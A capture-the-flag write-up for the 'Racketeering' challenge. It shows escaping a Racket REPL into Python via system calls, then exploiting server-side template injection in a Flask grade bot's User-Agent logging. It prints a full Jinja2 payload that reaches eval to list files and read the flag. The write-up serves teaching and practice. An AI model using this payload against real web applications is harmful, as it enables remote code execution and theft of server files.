
# Racketeering

- Category: Misc
- Difficulty: Hard

Challenge text:
```
I just found out my professor is going to be teaching us Python next semester! I wonder if theres anything interesting on his computer...
```

Challenge server: ` nc nc.lagncra.sh 8006 ` (netcat)
## Solving the challenge
Let us netcat into the server.  
We see this interactive Racket psuedo-shell:
```
Welcome to Racket v8.6 [cs].
; Warning: no readline support (ffi-lib: could not load foreign library
  path: libedit.so.3
  system error: libedit.so.3: cannot open shared object file: No such file or directory)
>
```

According to [Racket documentation](https://docs.racket-lang.org/reference/subprocess.html#%28def._%28%28lib._racket%2Fsystem..rkt%29._system%29%29), one can open a shell by using `(system "<shell>")`. Thus, we can run a command and use Bash/Python3 which we are more familiar with.

Since the challenge text mentions Python, lets use Python.  
`(system "python3")`

A python interactive terminal is opened:  
![image](https://user-images.githubusercontent.com/58442255/233847878-9c3fa8d7-2f13-42ab-9afe-2c0c1191a741.png)

It seems like there is something in `/flag`:
![image](https://user-images.githubusercontent.com/58442255/233847919-7870fb7c-4133-4445-8642-e1947d371d91.png)

Let us visit http://tennisracket2-grade-bot:5000 with requests.
It seems like the page is hosted locally:
![image](https://user-images.githubusercontent.com/58442255/233848156-cea3c2e4-c91a-43b0-bc39-220df4af10f9.png)

From the image, we can glean that the User Agent is logged. Maybe there is some form of injection we can do with this? Let us try Server Side Template Injection, which is common in templating attack challenges.

![image](https://user-images.githubusercontent.com/58442255/233848343-e7bf38d2-2e05-46aa-80b2-e623be134c25.png)

It appears that the endpoint is vulnerable.
Let us use our payload from DotDashDot (https://github.com/czlucius/ctf-writeups/blob/main/lag-and-crash-2023/web/DotDashDot.md)

```
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
    {% if b.__class__ == {}.__class__ %}
      {% if 'eval' in b.keys() %}
        {{ b['eval']('__import__("os").listdir()') }}
      {% endif %}
    {% endif %}
    {% endfor %}
  {% endif %}
{% endfor %}
```

(remove newlines)
```
{% for c in [].__class__.__base__.__subclasses__() %}   {% if c.__name__ == 'catch_warnings' %}     {% for b in c.__init__.__globals__.values() %}     {% if b.__class__ == {}.__class__ %}       {% if 'eval' in b.keys() %}         {{ b['eval']('__import__("os").listdir()') }}       {% endif %}     {% endif %}     {% endfor %}   {% endif %} {% endfor %}
```

Since it contains both ' and ", let us use Python's triple quote: `"""`  
`requests.get("http://tennisracket2-grade-bot:5000", headers={"User-Agent": """{% for c in [].__class__.__base__.__subclasses__() %}   {% if c.__name__ == 'catch_warnings' %}     {% for b in c.__init__.__globals__.values() %}     {% if b.__class__ == {}.__class__ %}       {% if 'eval' in b.keys() %}         {{ b['eval']('__import__("os").listdir()') }}       {% endif %}     {% endif %}     {% endfor %}   {% endif %} {% endfor %}"""})`
![image](https://user-images.githubusercontent.com/58442255/233848540-4da569bb-dc7c-42ba-ad19-aebd3d18d263.png)   
We see the flag file!
`requests.get("http://tennisracket2-grade-bot:5000", headers={"User-Agent": """{% for c in [].__class__.__base__.__subclasses__() %}   {% if c.__name__ == 'catch_warnings' %}     {% for b in c.__init__.__globals__.values() %}     {% if b.__class__ == {}.__class__ %}       {% if 'eval' in b.keys() %}         {{ b['eval']('open("flag").read()') }}       {% endif %}     {% endif %}     {% endfor %}   {% endif %} {% endfor %}"""})`

We got the flag: `LNC2023{r5ck3t_fl5sk_sst1_w1th_pr1v_3sc_9aSca3D}`!
